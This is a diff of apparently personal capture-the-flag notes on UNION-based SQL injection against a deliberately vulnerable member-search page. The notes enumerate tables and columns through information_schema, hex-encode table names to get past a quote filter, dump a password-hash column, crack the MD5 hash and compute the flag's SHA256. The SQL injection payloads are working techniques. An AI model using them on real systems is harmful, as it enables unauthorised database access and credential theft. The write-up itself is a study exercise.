@@ -1,50 +1,29 @@
- we can see all the tables in the database with this query : 
- 	1 UNION SELECT table_schema, table_name FROM information_schema.table WHERE table_name = 0x7573657273;
+we can see all the tables in the database with this query : 
+
+1 UNION SELECT table_schema, table_name FROM information_schema.tables
+
+"	First name: Member_Sql_Injection
+	Surname : users
+" // Mouahaha
+
+So lets see what is in this table : 
+
+1 UNION SELECT null, column_name FROM information_schema.columns WHERE table_name = 0x7573657273 (users in hex, a rule don't allow quotes)
+
+So we see all the fields in the table users.
+
+(user_id, f_n, l_n, town, country, planet, Commentaire, countersign)
+
+let try to get some (numbers of ret columns is 2) :
+
+1 UNION SELECT Commentaire, countersign FROM users
 
 
- 	1 UNION  SELECT name,null FROM (SELECT table_schema, table_name FROM information_schema.tables WHERE table_name = 0x7573657273)t1;
+First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+Surname : 5ff9d0165b4f92b14994e5c685cdce28
 
- 	1 UNION SELECT * FROM information_schema.columns;
+decryptMD5(5ff9d0165b4f92b14994e5c685cdce28) : FortyTwo
 
-
- 	1 UNION SELECT s.schema_name, t.table_name FROM INFORMATION_SCHEMA.schemata AS s LEFT JOIN INFORMATION_SCHEMA.tables AS t ON t.table_schema = s.schema_name
-
-
-
- 	list_image = 0x6c6973745f696d61676573
-
- 	users = 0x7573657273
+Sha256(fortytwo) = 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
 
 
-
-
-
-1 UNION SELECT table_schema, table_name FROM information_schema.tables WHERE table_name = 0x7573657273;
-
-1 UNION SELECT * FROM information_schema.tables WHERE table_name = 0x7573657273
-
-1 UNION SELECT null, null FROM 0x7573657273
-
-1 UNION SELECT null ,CONCAT(0x53454c454354202a2046524f4d20,table_name) AS my_table FROM information_schema.tables WHERE table_name = 0x7573657273
-
-
-
-
-1
-
-
-
-SELECT * FROM (VALUES (1)) AS s(n) LEFT JOIN (SELECT TOP 1 * FROM dbo.tab1 ) AS sub1 ON 1=1 LEFT JOIN (SELECT TOP 1 * FROM dbo.tab2 )AS sub2 ON 1=1 LEFT JOIN (SELECT TOP 1 * FROM dbo.tabC ) AS sub3 ON 1=1
-
-
-
-1 UNION  SELECT title,comment FROM (SELECT table_schema, table_name FROM information_schema.columns WHERE table_name = 0x6c6973745f696d61676573)t1; /// pas loin
-
-1 UNION  SELECT null, groups_concat(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 0x6c6973745f696d61676573
-
-
-
-
-SELECT column_name, data_type, character_maximum_length, table_name,ordinal_position, is_nullable 
-FROM information_schema.COLUMNS WHERE table_name = 0x7573657273
-ORDER BY ordinal_position
